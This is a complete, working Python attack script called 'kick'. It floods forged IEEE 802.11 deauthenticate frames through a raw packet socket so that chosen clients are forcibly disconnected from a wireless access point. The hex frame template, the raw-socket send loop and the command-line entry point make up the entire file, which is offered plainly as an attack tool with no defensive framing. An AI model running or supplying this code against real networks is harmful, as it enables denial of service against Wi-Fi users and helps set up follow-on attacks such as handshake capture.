#!/usr/bin/env python3



'''kick, conduct IEEE 802.11 deauthenticate attacks.

Usage: kick <if> <wap> <sta>

An attacker can force WPA supplicants to disconnect from a wireless
access point by emitting fictitious deauthenticate packets.'''



from socket import *
from sys import argv



# A template for generic 802.11 deauthenticate packets. Can't be 
# bothered with the details of each feild.

deauth = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'



# Remove colons from a MAC address, just leaving the hex string.

def mac(string):
    return string.replace(':', str())



# Construct a deauthenticate packet with inserted WAP and STA MAC
# addresses.

def construct(wap, sta):

    string = deauth.format(mac(wap), mac(sta))
    packet = bytes.fromhex(string)

    return packet



# Repeatedly transmit a given packet using a certain network
# interface.

def flood(iface, packet):
    # Create a raw socket able to transmit from the data link layer.

    link = socket(AF_PACKET, SOCK_RAW, 0)
    link.bind((iface, 0))

    while True: 
        link.send(packet)



# Perform the deauthenticate attack. Construct a packet and flood the
# target until an interrupt is recieved.

def exploit(iface, wap, sta):
    try:
        packet = construct(wap, sta)
        flood(iface, packet)

    except:
        return
        


# Program entry point: take in command line arguments and call
# exploit() with them.

def main():
    if len(argv) == 4:

        print('Starting deauthenticate attack. ^C to quit.')
        exploit(*argv[1:])
        
        print('Bye')

    else:
        print(__doc__)



main()

